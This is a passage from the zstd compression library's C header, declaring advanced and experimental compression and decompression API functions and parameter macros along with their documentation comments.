 *  Set all parameters provided within @p cparams into the working @p cctx.
 *  Note : if modifying parameters during compression (MT mode only),
 *         note that changes to the .windowLog parameter will be ignored.
 * @return 0 on success, or an error code (can be checked with ZSTD_isError()).
 *         On failure, no parameters are updated.
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_setCParams(ZSTD_CCtx* cctx, ZSTD_compressionParameters cparams);

/*! ZSTD_CCtx_setFParams() :
 *  Set all parameters provided within @p fparams into the working @p cctx.
 * @return 0 on success, or an error code (can be checked with ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_setFParams(ZSTD_CCtx* cctx, ZSTD_frameParameters fparams);

/*! ZSTD_CCtx_setParams() :
 *  Set all parameters provided within @p params into the working @p cctx.
 * @return 0 on success, or an error code (can be checked with ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_setParams(ZSTD_CCtx* cctx, ZSTD_parameters params);

/*! ZSTD_compress_advanced() :
 *  Note : this function is now DEPRECATED.
 *         It can be replaced by ZSTD_compress2(), in combination with ZSTD_CCtx_setParameter() and other parameter setters.
 *  This prototype will generate compilation warnings. */
ZSTD_DEPRECATED("use ZSTD_compress2")
ZSTDLIB_STATIC_API
size_t ZSTD_compress_advanced(ZSTD_CCtx* cctx,
                              void* dst, size_t dstCapacity,
                        const void* src, size_t srcSize,
                        const void* dict,size_t dictSize,
                              ZSTD_parameters params);

/*! ZSTD_compress_usingCDict_advanced() :
 *  Note : this function is now DEPRECATED.
 *         It can be replaced by ZSTD_compress2(), in combination with ZSTD_CCtx_loadDictionary() and other parameter setters.
 *  This prototype will generate compilation warnings. */
ZSTD_DEPRECATED("use ZSTD_compress2 with ZSTD_CCtx_loadDictionary")
ZSTDLIB_STATIC_API
size_t ZSTD_compress_usingCDict_advanced(ZSTD_CCtx* cctx,
                                              void* dst, size_t dstCapacity,
                                        const void* src, size_t srcSize,
                                        const ZSTD_CDict* cdict,
                                              ZSTD_frameParameters fParams);


/*! ZSTD_CCtx_loadDictionary_byReference() :
 *  Same as ZSTD_CCtx_loadDictionary(), but dictionary content is referenced, instead of being copied into CCtx.
 *  It saves some memory, but also requires that `dict` outlives its usage within `cctx` */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_loadDictionary_byReference(ZSTD_CCtx* cctx, const void* dict, size_t dictSize);

/*! ZSTD_CCtx_loadDictionary_advanced() :
 *  Same as ZSTD_CCtx_loadDictionary(), but gives finer control over
 *  how to load the dictionary (by copy ? by reference ?)
 *  and how to interpret it (automatic ? force raw mode ? full mode only ?) */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_loadDictionary_advanced(ZSTD_CCtx* cctx, const void* dict, size_t dictSize, ZSTD_dictLoadMethod_e dictLoadMethod, ZSTD_dictContentType_e dictContentType);

/*! ZSTD_CCtx_refPrefix_advanced() :
 *  Same as ZSTD_CCtx_refPrefix(), but gives finer control over
 *  how to interpret prefix content (automatic ? force raw mode (default) ? full mode only ?) */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_refPrefix_advanced(ZSTD_CCtx* cctx, const void* prefix, size_t prefixSize, ZSTD_dictContentType_e dictContentType);

/* ===   experimental parameters   === */
/* these parameters can be used with ZSTD_setParameter()
 * they are not guaranteed to remain supported in the future */

 /* Enables rsyncable mode,
  * which makes compressed files more rsync friendly
  * by adding periodic synchronization points to the compressed data.
  * The target average block size is ZSTD_c_jobSize / 2.
  * It's possible to modify the job size to increase or decrease
  * the granularity of the synchronization point.
  * Once the jobSize is smaller than the window size,
  * it will result in compression ratio degradation.
  * NOTE 1: rsyncable mode only works when multithreading is enabled.
  * NOTE 2: rsyncable performs poorly in combination with long range mode,
  * since it will decrease the effectiveness of synchronization points,
  * though mileage may vary.
  * NOTE 3: Rsyncable mode limits maximum compression speed to ~400 MB/s.
  * If the selected compression level is already running significantly slower,
  * the overall speed won't be significantly impacted.
  */
 #define ZSTD_c_rsyncable ZSTD_c_experimentalParam1

/* Select a compression format.
 * The value must be of type ZSTD_format_e.
 * See ZSTD_format_e enum definition for details */
#define ZSTD_c_format ZSTD_c_experimentalParam2

/* Force back-reference distances to remain < windowSize,
 * even when referencing into Dictionary content (default:0) */
#define ZSTD_c_forceMaxWindow ZSTD_c_experimentalParam3

/* Controls whether the contents of a CDict
 * are used in place, or copied into the working context.
 * Accepts values from the ZSTD_dictAttachPref_e enum.
 * See the comments on that enum for an explanation of the feature. */
#define ZSTD_c_forceAttachDict ZSTD_c_experimentalParam4

/* Controlled with ZSTD_paramSwitch_e enum.
 * Default is ZSTD_ps_auto.
 * Set to ZSTD_ps_disable to never compress literals.
 * Set to ZSTD_ps_enable to always compress literals. (Note: uncompressed literals
 * may still be emitted if huffman is not beneficial to use.)
 *
 * By default, in ZSTD_ps_auto, the library will decide at runtime whether to use
 * literals compression based on the compression parameters - specifically,
 * negative compression levels do not use literal compression.
 */
#define ZSTD_c_literalCompressionMode ZSTD_c_experimentalParam5

/* Tries to fit compressed block size to be around targetCBlockSize.
 * No target when targetCBlockSize == 0.
 * There is no guarantee on compressed block size (default:0) */
#define ZSTD_c_targetCBlockSize ZSTD_c_experimentalParam6

/* User's best guess of source size.
 * Hint is not valid when srcSizeHint == 0.
 * There is no guarantee that hint is close to actual source size,
 * but compression ratio may regress significantly if guess considerably underestimates */
#define ZSTD_c_srcSizeHint ZSTD_c_experimentalParam7

/* Controls whether the new and experimental "dedicated dictionary search
 * structure" can be used. This feature is still rough around the edges, be
 * prepared for surprising behavior!
 *
 * How to use it:
 *
 * When using a CDict, whether to use this feature or not is controlled at
 * CDict creation, and it must be set in a CCtxParams set passed into that
 * construction (via ZSTD_createCDict_advanced2()). A compression will then
 * use the feature or not based on how the CDict was constructed; the value of
 * this param, set in the CCtx, will have no effect.
 *
 * However, when a dictionary buffer is passed into a CCtx, such as via
 * ZSTD_CCtx_loadDictionary(), this param can be set on the CCtx to control
 * whether the CDict that is created internally can use the feature or not.
 *
 * What it does:
 *
 * Normally, the internal data structures of the CDict are analogous to what
 * would be stored in a CCtx after compressing the contents of a dictionary.
 * To an approximation, a compression using a dictionary can then use those
 * data structures to simply continue what is effectively a streaming
 * compression where the simulated compression of the dictionary left off.
 * Which is to say, the search structures in the CDict are normally the same
 * format as in the CCtx.
 *
 * It is possible to do better, since the CDict is not like a CCtx: the search
 * structures are written once during CDict creation, and then are only read
 * after that, while the search structures in the CCtx are both read and
 * written as the compression goes along. This means we can choose a search
 * structure for the dictionary that is read-optimized.
 *
 * This feature enables the use of that different structure.
 *
 * Note that some of the members of the ZSTD_compressionParameters struct have
 * different semantics and constraints in the dedicated search structure. It is
 * highly recommended that you simply set a compression level in the CCtxParams
 * you pass into the CDict creation call, and avoid messing with the cParams
 * directly.
 *
 * Effects:
 *
 * This will only have any effect when the selected ZSTD_strategy
 * implementation supports this feature. Currently, that's limited to
 * ZSTD_greedy, ZSTD_lazy, and ZSTD_lazy2.
 *
 * Note that this means that the CDict tables can no longer be copied into the
 * CCtx, so the dict attachment mode ZSTD_dictForceCopy will no longer be
 * usable. The dictionary can only be attached or reloaded.
 *
 * In general, you should expect compression to be faster--sometimes very much
 * so--and CDict creation to be slightly slower. Eventually, we will probably
 * make this mode the default.
 */
#define ZSTD_c_enableDedicatedDictSearch ZSTD_c_experimentalParam8

/* ZSTD_c_stableInBuffer
 * Experimental parameter.
 * Default is 0 == disabled. Set to 1 to enable.
 *
 * Tells the compressor that input data presented with ZSTD_inBuffer
 * will ALWAYS be the same between calls.
 * Technically, the @src pointer must never be changed,
 * and the @pos field can only be updated by zstd.
 * However, it's possible to increase the @size field,
 * allowing scenarios where more data can be appended after compressions starts.
 * These conditions are checked by the compressor,
 * and compression will fail if they are not respected.
 * Also, data in the ZSTD_inBuffer within the range [src, src + pos)
 * MUST not be modified during compression or it will result in data corruption.
 *
 * When this flag is enabled zstd won't allocate an input window buffer,
 * because the user guarantees it can reference the ZSTD_inBuffer until
 * the frame is complete. But, it will still allocate an output buffer
 * large enough to fit a block (see ZSTD_c_stableOutBuffer). This will also
 * avoid the memcpy() from the input buffer to the input window buffer.
 *
 * NOTE: So long as the ZSTD_inBuffer always points to valid memory, using
 * this flag is ALWAYS memory safe, and will never access out-of-bounds
 * memory. However, compression WILL fail if conditions are not respected.
 *
 * WARNING: The data in the ZSTD_inBuffer in the range [src, src + pos) MUST
 * not be modified during compression or it will result in data corruption.
 * This is because zstd needs to reference data in the ZSTD_inBuffer to find
 * matches. Normally zstd maintains its own window buffer for this purpose,
 * but passing this flag tells zstd to rely on user provided buffer instead.
 */
#define ZSTD_c_stableInBuffer ZSTD_c_experimentalParam9

/* ZSTD_c_stableOutBuffer
 * Experimental parameter.
 * Default is 0 == disabled. Set to 1 to enable.
 *
 * Tells he compressor that the ZSTD_outBuffer will not be resized between
 * calls. Specifically: (out.size - out.pos) will never grow. This gives the
 * compressor the freedom to say: If the compressed data doesn't fit in the
 * output buffer then return ZSTD_error_dstSizeTooSmall. This allows us to
 * always decompress directly into the output buffer, instead of decompressing
 * into an internal buffer and copying to the output buffer.
 *
 * When this flag is enabled zstd won't allocate an output buffer, because
 * it can write directly to the ZSTD_outBuffer. It will still allocate the
 * input window buffer (see ZSTD_c_stableInBuffer).
 *
 * Zstd will check that (out.size - out.pos) never grows and return an error
 * if it does. While not strictly necessary, this should prevent surprises.
 */
#define ZSTD_c_stableOutBuffer ZSTD_c_experimentalParam10

/* ZSTD_c_blockDelimiters
 * Default is 0 == ZSTD_sf_noBlockDelimiters.
 *
 * For use with sequence compression API: ZSTD_compressSequences().
 *
 * Designates whether or not the given array of ZSTD_Sequence contains block delimiters
 * and last literals, which are defined as sequences with offset == 0 and matchLength == 0.
 * See the definition of ZSTD_Sequence for more specifics.
 */
#define ZSTD_c_blockDelimiters ZSTD_c_experimentalParam11

/* ZSTD_c_validateSequences
 * Default is 0 == disabled. Set to 1 to enable sequence validation.
 *
 * For use with sequence compression API: ZSTD_compressSequences().
 * Designates whether or not we validate sequences provided to ZSTD_compressSequences()
 * during function execution.
 *
 * Without validation, providing a sequence that does not conform to the zstd spec will cause
 * undefined behavior, and may produce a corrupted block.
 *
 * With validation enabled, if sequence is invalid (see doc/zstd_compression_format.md for
 * specifics regarding offset/matchlength requirements) then the function will bail out and
 * return an error.
 *
 */
#define ZSTD_c_validateSequences ZSTD_c_experimentalParam12

/* ZSTD_c_useBlockSplitter
 * Controlled with ZSTD_paramSwitch_e enum.
 * Default is ZSTD_ps_auto.
 * Set to ZSTD_ps_disable to never use block splitter.
 * Set to ZSTD_ps_enable to always use block splitter.
 *
 * By default, in ZSTD_ps_auto, the library will decide at runtime whether to use
 * block splitting based on the compression parameters.
 */
#define ZSTD_c_useBlockSplitter ZSTD_c_experimentalParam13

/* ZSTD_c_useRowMatchFinder
 * Controlled with ZSTD_paramSwitch_e enum.
 * Default is ZSTD_ps_auto.
 * Set to ZSTD_ps_disable to never use row-based matchfinder.
 * Set to ZSTD_ps_enable to force usage of row-based matchfinder.
 *
 * By default, in ZSTD_ps_auto, the library will decide at runtime whether to use
 * the row-based matchfinder based on support for SIMD instructions and the window log.
 * Note that this only pertains to compression strategies: greedy, lazy, and lazy2
 */
#define ZSTD_c_useRowMatchFinder ZSTD_c_experimentalParam14

/* ZSTD_c_deterministicRefPrefix
 * Default is 0 == disabled. Set to 1 to enable.
 *
 * Zstd produces different results for prefix compression when the prefix is
 * directly adjacent to the data about to be compressed vs. when it isn't.
 * This is because zstd detects that the two buffers are contiguous and it can
 * use a more efficient match finding algorithm. However, this produces different
 * results than when the two buffers are non-contiguous. This flag forces zstd
 * to always load the prefix in non-contiguous mode, even if it happens to be
 * adjacent to the data, to guarantee determinism.
 *
 * If you really care about determinism when using a dictionary or prefix,
 * like when doing delta compression, you should select this option. It comes
 * at a speed penalty of about ~2.5% if the dictionary and data happened to be
 * contiguous, and is free if they weren't contiguous. We don't expect that
 * intentionally making the dictionary and data contiguous will be worth the
 * cost to memcpy() the data.
 */
#define ZSTD_c_deterministicRefPrefix ZSTD_c_experimentalParam15

/* ZSTD_c_prefetchCDictTables
 * Controlled with ZSTD_paramSwitch_e enum. Default is ZSTD_ps_auto.
 *
 * In some situations, zstd uses CDict tables in-place rather than copying them
 * into the working context. (See docs on ZSTD_dictAttachPref_e above for details).
 * In such situations, compression speed is seriously impacted when CDict tables are
 * "cold" (outside CPU cache). This parameter instructs zstd to prefetch CDict tables
 * when they are used in-place.
 *
 * For sufficiently small inputs, the cost of the prefetch will outweigh the benefit.
 * For sufficiently large inputs, zstd will by default memcpy() CDict tables
 * into the working context, so there is no need to prefetch. This parameter is
 * targeted at a middle range of input sizes, where a prefetch is cheap enough to be
 * useful but memcpy() is too expensive. The exact range of input sizes where this
 * makes sense is best determined by careful experimentation.
 *
 * Note: for this parameter, ZSTD_ps_auto is currently equivalent to ZSTD_ps_disable,
 * but in the future zstd may conditionally enable this feature via an auto-detection
 * heuristic for cold CDicts.
 * Use ZSTD_ps_disable to opt out of prefetching under any circumstances.
 */
#define ZSTD_c_prefetchCDictTables ZSTD_c_experimentalParam16

/* ZSTD_c_enableSeqProducerFallback
 * Allowed values are 0 (disable) and 1 (enable). The default setting is 0.
 *
 * Controls whether zstd will fall back to an internal sequence producer if an
 * external sequence producer is registered and returns an error code. This fallback
 * is block-by-block: the internal sequence producer will only be called for blocks
 * where the external sequence producer returns an error code. Fallback parsing will
 * follow any other cParam settings, such as compression level, the same as in a
 * normal (fully-internal) compression operation.
 *
 * The user is strongly encouraged to read the full Block-Level Sequence Producer API
 * documentation (below) before setting this parameter. */
#define ZSTD_c_enableSeqProducerFallback ZSTD_c_experimentalParam17

/* ZSTD_c_maxBlockSize
 * Allowed values are between 1KB and ZSTD_BLOCKSIZE_MAX (128KB).
 * The default is ZSTD_BLOCKSIZE_MAX, and setting to 0 will set to the default.
 *
 * This parameter can be used to set an upper bound on the blocksize
 * that overrides the default ZSTD_BLOCKSIZE_MAX. It cannot be used to set upper
 * bounds greater than ZSTD_BLOCKSIZE_MAX or bounds lower than 1KB (will make
 * compressBound() inaccurate). Only currently meant to be used for testing.
 *
 */
#define ZSTD_c_maxBlockSize ZSTD_c_experimentalParam18

/* ZSTD_c_searchForExternalRepcodes
 * This parameter affects how zstd parses external sequences, such as sequences
 * provided through the compressSequences() API or from an external block-level
 * sequence producer.
 *
 * If set to ZSTD_ps_enable, the library will check for repeated offsets in
 * external sequences, even if those repcodes are not explicitly indicated in
 * the "rep" field. Note that this is the only way to exploit repcode matches
 * while using compressSequences() or an external sequence producer, since zstd
 * currently ignores the "rep" field of external sequences.
 *
 * If set to ZSTD_ps_disable, the library will not exploit repeated offsets in
 * external sequences, regardless of whether the "rep" field has been set. This
 * reduces sequence compression overhead by about 25% while sacrificing some
 * compression ratio.
 *
 * The default value is ZSTD_ps_auto, for which the library will enable/disable
 * based on compression level.
 *
 * Note: for now, this param only has an effect if ZSTD_c_blockDelimiters is
 * set to ZSTD_sf_explicitBlockDelimiters. That may change in the future.
 */
#define ZSTD_c_searchForExternalRepcodes ZSTD_c_experimentalParam19

/*! ZSTD_CCtx_getParameter() :
 *  Get the requested compression parameter value, selected by enum ZSTD_cParameter,
 *  and store it into int* value.
 * @return : 0, or an error code (which can be tested with ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_getParameter(const ZSTD_CCtx* cctx, ZSTD_cParameter param, int* value);


/*! ZSTD_CCtx_params :
 *  Quick howto :
 *  - ZSTD_createCCtxParams() : Create a ZSTD_CCtx_params structure
 *  - ZSTD_CCtxParams_setParameter() : Push parameters one by one into
 *                                     an existing ZSTD_CCtx_params structure.
 *                                     This is similar to
 *                                     ZSTD_CCtx_setParameter().
 *  - ZSTD_CCtx_setParametersUsingCCtxParams() : Apply parameters to
 *                                    an existing CCtx.
 *                                    These parameters will be applied to
 *                                    all subsequent frames.
 *  - ZSTD_compressStream2() : Do compression using the CCtx.
 *  - ZSTD_freeCCtxParams() : Free the memory, accept NULL pointer.
 *
 *  This can be used with ZSTD_estimateCCtxSize_advanced_usingCCtxParams()
 *  for static allocation of CCtx for single-threaded compression.
 */
ZSTDLIB_STATIC_API ZSTD_CCtx_params* ZSTD_createCCtxParams(void);
ZSTDLIB_STATIC_API size_t ZSTD_freeCCtxParams(ZSTD_CCtx_params* params);  /* accept NULL pointer */

/*! ZSTD_CCtxParams_reset() :
 *  Reset params to default values.
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtxParams_reset(ZSTD_CCtx_params* params);

/*! ZSTD_CCtxParams_init() :
 *  Initializes the compression parameters of cctxParams according to
 *  compression level. All other parameters are reset to their default values.
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtxParams_init(ZSTD_CCtx_params* cctxParams, int compressionLevel);

/*! ZSTD_CCtxParams_init_advanced() :
 *  Initializes the compression and frame parameters of cctxParams according to
 *  params. All other parameters are reset to their default values.
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtxParams_init_advanced(ZSTD_CCtx_params* cctxParams, ZSTD_parameters params);

/*! ZSTD_CCtxParams_setParameter() : Requires v1.4.0+
 *  Similar to ZSTD_CCtx_setParameter.
 *  Set one compression parameter, selected by enum ZSTD_cParameter.
 *  Parameters must be applied to a ZSTD_CCtx using
 *  ZSTD_CCtx_setParametersUsingCCtxParams().
 * @result : a code representing success or failure (which can be tested with
 *           ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtxParams_setParameter(ZSTD_CCtx_params* params, ZSTD_cParameter param, int value);

/*! ZSTD_CCtxParams_getParameter() :
 * Similar to ZSTD_CCtx_getParameter.
 * Get the requested value of one compression parameter, selected by enum ZSTD_cParameter.
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtxParams_getParameter(const ZSTD_CCtx_params* params, ZSTD_cParameter param, int* value);

/*! ZSTD_CCtx_setParametersUsingCCtxParams() :
 *  Apply a set of ZSTD_CCtx_params to the compression context.
 *  This can be done even after compression is started,
 *    if nbWorkers==0, this will have no impact until a new compression is started.
 *    if nbWorkers>=1, new parameters will be picked up at next job,
 *       with a few restrictions (windowLog, pledgedSrcSize, nbWorkers, jobSize, and overlapLog are not updated).
 */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_setParametersUsingCCtxParams(
        ZSTD_CCtx* cctx, const ZSTD_CCtx_params* params);

/*! ZSTD_compressStream2_simpleArgs() :
 *  Same as ZSTD_compressStream2(),
 *  but using only integral types as arguments.
 *  This variant might be helpful for binders from dynamic languages
 *  which have troubles handling structures containing memory pointers.
 */
ZSTDLIB_STATIC_API size_t ZSTD_compressStream2_simpleArgs (
                            ZSTD_CCtx* cctx,
                            void* dst, size_t dstCapacity, size_t* dstPos,
                      const void* src, size_t srcSize, size_t* srcPos,
                            ZSTD_EndDirective endOp);


/***************************************
*  Advanced decompression functions
***************************************/

/*! ZSTD_isFrame() :
 *  Tells if the content of `buffer` starts with a valid Frame Identifier.
 *  Note : Frame Identifier is 4 bytes. If `size < 4`, @return will always be 0.
 *  Note 2 : Legacy Frame Identifiers are considered valid only if Legacy Support is enabled.
 *  Note 3 : Skippable Frame Identifiers are considered valid. */
ZSTDLIB_STATIC_API unsigned ZSTD_isFrame(const void* buffer, size_t size);

/*! ZSTD_createDDict_byReference() :
 *  Create a digested dictionary, ready to start decompression operation without startup delay.
 *  Dictionary content is referenced, and therefore stays in dictBuffer.
 *  It is important that dictBuffer outlives DDict,
 *  it must remain read accessible throughout the lifetime of DDict */
ZSTDLIB_STATIC_API ZSTD_DDict* ZSTD_createDDict_byReference(const void* dictBuffer, size_t dictSize);

/*! ZSTD_DCtx_loadDictionary_byReference() :
 *  Same as ZSTD_DCtx_loadDictionary(),
 *  but references `dict` content instead of copying it into `dctx`.
 *  This saves memory if `dict` remains around.,
 *  However, it's imperative that `dict` remains accessible (and unmodified) while being used, so it must outlive decompression. */
ZSTDLIB_STATIC_API size_t ZSTD_DCtx_loadDictionary_byReference(ZSTD_DCtx* dctx, const void* dict, size_t dictSize);

/*! ZSTD_DCtx_loadDictionary_advanced() :
 *  Same as ZSTD_DCtx_loadDictionary(),
 *  but gives direct control over
 *  how to load the dictionary (by copy ? by reference ?)
 *  and how to interpret it (automatic ? force raw mode ? full mode only ?). */
ZSTDLIB_STATIC_API size_t ZSTD_DCtx_loadDictionary_advanced(ZSTD_DCtx* dctx, const void* dict, size_t dictSize, ZSTD_dictLoadMethod_e dictLoadMethod, ZSTD_dictContentType_e dictContentType);

/*! ZSTD_DCtx_refPrefix_advanced() :
 *  Same as ZSTD_DCtx_refPrefix(), but gives finer control over
 *  how to interpret prefix content (automatic ? force raw mode (default) ? full mode only ?) */
ZSTDLIB_STATIC_API size_t ZSTD_DCtx_refPrefix_advanced(ZSTD_DCtx* dctx, const void* prefix, size_t prefixSize, ZSTD_dictContentType_e dictContentType);

/*! ZSTD_DCtx_setMaxWindowSize() :
 *  Refuses allocating internal buffers for frames requiring a window size larger than provided limit.
 *  This protects a decoder context from reserving too much memory for itself (potential attack scenario).
 *  This parameter is only useful in streaming mode, since no internal buffer is allocated in single-pass mode.
 *  By default, a decompression context accepts all window sizes <= (1 << ZSTD_WINDOWLOG_LIMIT_DEFAULT)
 * @return : 0, or an error code (which can be tested using ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_DCtx_setMaxWindowSize(ZSTD_DCtx* dctx, size_t maxWindowSize);

/*! ZSTD_DCtx_getParameter() :
 *  Get the requested decompression parameter value, selected by enum ZSTD_dParameter,
 *  and store it into int* value.
 * @return : 0, or an error code (which can be tested with ZSTD_isError()).
 */
ZSTDLIB_STATIC_API size_t ZSTD_DCtx_getParameter(ZSTD_DCtx* dctx, ZSTD_dParameter param, int* value);

/* ZSTD_d_format
 * experimental parameter,
 * allowing selection between ZSTD_format_e input compression formats
 */
#define ZSTD_d_format ZSTD_d_experimentalParam1
/* ZSTD_d_stableOutBuffer
 * Experimental parameter.
 * Default is 0 == disabled. Set to 1 to enable.
 *
 * Tells the decompressor that the ZSTD_outBuffer will ALWAYS be the same
 * between calls, except for the modifications that zstd makes to pos (the
 * caller must not modify pos). This is checked by the decompressor, and
 * decompression will fail if it ever changes. Therefore the ZSTD_outBuffer
 * MUST be large enough to fit the entire decompressed frame. This will be
 * checked when the frame content size is known. The data in the ZSTD_outBuffer
 * in the range [dst, dst + pos) MUST not be modified during decompression
 * or you will get data corruption.
 *
 * When this flag is enabled zstd won't allocate an output buffer, because
 * it can write directly to the ZSTD_outBuffer, but it will still allocate
 * an input buffer large enough to fit any compressed block. This will also
 * avoid the memcpy() from the internal output buffer to the ZSTD_outBuffer.
 * If you need to avoid the input buffer allocation use the buffer-less
 * streaming API.
 *
 * NOTE: So long as the ZSTD_outBuffer always points to valid memory, using
 * this flag is ALWAYS memory safe, and will never access out-of-bounds
 * memory. However, decompression WILL fail if you violate the preconditions.
 *
 * WARNING: The data in the ZSTD_outBuffer in the range [dst, dst + pos) MUST
 * not be modified during decompression or you will get data corruption. This
 * is because zstd needs to reference data in the ZSTD_outBuffer to regenerate
 * matches. Normally zstd maintains its own buffer for this purpose, but passing
 * this flag tells zstd to use the user provided buffer.
 */
#define ZSTD_d_stableOutBuffer ZSTD_d_experimentalParam2

/* ZSTD_d_forceIgnoreChecksum
 * Experimental parameter.
 * Default is 0 == disabled. Set to 1 to enable
 *
 * Tells the decompressor to skip checksum validation during decompression, regardless
 * of whether checksumming was specified during compression. This offers some
 * slight performance benefits, and may be useful for debugging.
 * Param has values of type ZSTD_forceIgnoreChecksum_e
 */
#define ZSTD_d_forceIgnoreChecksum ZSTD_d_experimentalParam3

/* ZSTD_d_refMultipleDDicts
 * Experimental parameter.
 * Default is 0 == disabled. Set to 1 to enable
 *
 * If enabled and dctx is allocated on the heap, then additional memory will be allocated
 * to store references to multiple ZSTD_DDict. That is, multiple calls of ZSTD_refDDict()
 * using a given ZSTD_DCtx, rather than overwriting the previous DDict reference, will instead
 * store all references. At decompression time, the appropriate dictID is selected
 * from the set of DDicts based on the dictID in the frame.
 *
 * Usage is simply calling ZSTD_refDDict() on multiple dict buffers.
 *
 * Param has values of byte ZSTD_refMultipleDDicts_e
 *
 * WARNING: Enabling this parameter and calling ZSTD_DCtx_refDDict(), will trigger memory
 * allocation for the hash table. ZSTD_freeDCtx() also frees this memory.
 * Memory is allocated as per ZSTD_DCtx::customMem.
 *
 * Although this function allocates memory for the table, the user is still responsible for
 * memory management of the underlying ZSTD_DDict* themselves.
 */
#define ZSTD_d_refMultipleDDicts ZSTD_d_experimentalParam4

/* ZSTD_d_disableHuffmanAssembly
 * Set to 1 to disable the Huffman assembly implementation.
 * The default value is 0, which allows zstd to use the Huffman assembly
 * implementation if available.
 *
 * This parameter can be used to disable Huffman assembly at runtime.
 * If you want to disable it at compile time you can define the macro
 * ZSTD_DISABLE_ASM.
 */
#define ZSTD_d_disableHuffmanAssembly ZSTD_d_experimentalParam5

/* ZSTD_d_maxBlockSize
 * Allowed values are between 1KB and ZSTD_BLOCKSIZE_MAX (128KB).
 * The default is ZSTD_BLOCKSIZE_MAX, and setting to 0 will set to the default.
 *
 * Forces the decompressor to reject blocks whose content size is
 * larger than the configured maxBlockSize. When maxBlockSize is
 * larger than the windowSize, the windowSize is used instead.
 * This saves memory on the decoder when you know all blocks are small.
 *
 * This option is typically used in conjunction with ZSTD_c_maxBlockSize.
 *
 * WARNING: This causes the decoder to reject otherwise valid frames
 * that have block sizes larger than the configured maxBlockSize.
 */
#define ZSTD_d_maxBlockSize ZSTD_d_experimentalParam6


/*! ZSTD_DCtx_setFormat() :
 *  This function is REDUNDANT. Prefer ZSTD_DCtx_setParameter().
 *  Instruct the decoder context about what kind of data to decode next.
 *  This instruction is mandatory to decode data without a fully-formed header,
 *  such ZSTD_f_zstd1_magicless for example.
 * @return : 0, or an error code (which can be tested using ZSTD_isError()). */
ZSTD_DEPRECATED("use ZSTD_DCtx_setParameter() instead")
ZSTDLIB_STATIC_API
size_t ZSTD_DCtx_setFormat(ZSTD_DCtx* dctx, ZSTD_format_e format);

/*! ZSTD_decompressStream_simpleArgs() :
 *  Same as ZSTD_decompressStream(),
 *  but using only integral types as arguments.
 *  This can be helpful for binders from dynamic languages
 *  which have troubles handling structures containing memory pointers.
 */
ZSTDLIB_STATIC_API size_t ZSTD_decompressStream_simpleArgs (
                            ZSTD_DCtx* dctx,
                            void* dst, size_t dstCapacity, size_t* dstPos,
                      const void* src, size_t srcSize, size_t* srcPos);


/********************************************************************
*  Advanced streaming functions
*  Warning : most of these functions are now redundant with the Advanced API.
*  Once Advanced API reaches "stable" status,
*  redundant functions will be deprecated, and then at some point removed.
********************************************************************/

/*=====   Advanced Streaming compression functions  =====*/

/*! ZSTD_initCStream_srcSize() :
 * This function is DEPRECATED, and equivalent to:
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_refCDict(zcs, NULL); // clear the dictionary (if any)
 *     ZSTD_CCtx_setParameter(zcs, ZSTD_c_compressionLevel, compressionLevel);
 *     ZSTD_CCtx_setPledgedSrcSize(zcs, pledgedSrcSize);
 *
 * pledgedSrcSize must be correct. If it is not known at init time, use
 * ZSTD_CONTENTSIZE_UNKNOWN. Note that, for compatibility with older programs,
 * "0" also disables frame content size field. It may be enabled in the future.
 * This prototype will generate compilation warnings.
 */
ZSTD_DEPRECATED("use ZSTD_CCtx_reset, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API
size_t ZSTD_initCStream_srcSize(ZSTD_CStream* zcs,
                         int compressionLevel,
                         unsigned long long pledgedSrcSize);

/*! ZSTD_initCStream_usingDict() :
 * This function is DEPRECATED, and is equivalent to:
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_setParameter(zcs, ZSTD_c_compressionLevel, compressionLevel);
 *     ZSTD_CCtx_loadDictionary(zcs, dict, dictSize);
 *
 * Creates of an internal CDict (incompatible with static CCtx), except if
 * dict == NULL or dictSize < 8, in which case no dict is used.
 * Note: dict is loaded with ZSTD_dct_auto (treated as a full zstd dictionary if
 * it begins with ZSTD_MAGIC_DICTIONARY, else as raw content) and ZSTD_dlm_byCopy.
 * This prototype will generate compilation warnings.
 */
ZSTD_DEPRECATED("use ZSTD_CCtx_reset, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API
size_t ZSTD_initCStream_usingDict(ZSTD_CStream* zcs,
                     const void* dict, size_t dictSize,
                           int compressionLevel);

/*! ZSTD_initCStream_advanced() :
 * This function is DEPRECATED, and is equivalent to:
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_setParams(zcs, params);
 *     ZSTD_CCtx_setPledgedSrcSize(zcs, pledgedSrcSize);
 *     ZSTD_CCtx_loadDictionary(zcs, dict, dictSize);
 *
 * dict is loaded with ZSTD_dct_auto and ZSTD_dlm_byCopy.
 * pledgedSrcSize must be correct.
 * If srcSize is not known at init time, use value ZSTD_CONTENTSIZE_UNKNOWN.
 * This prototype will generate compilation warnings.
 */
ZSTD_DEPRECATED("use ZSTD_CCtx_reset, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API
size_t ZSTD_initCStream_advanced(ZSTD_CStream* zcs,
                    const void* dict, size_t dictSize,
                          ZSTD_parameters params,
                          unsigned long long pledgedSrcSize);

/*! ZSTD_initCStream_usingCDict() :
 * This function is DEPRECATED, and equivalent to:
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_refCDict(zcs, cdict);
 *
 * note : cdict will just be referenced, and must outlive compression session
 * This prototype will generate compilation warnings.
 */
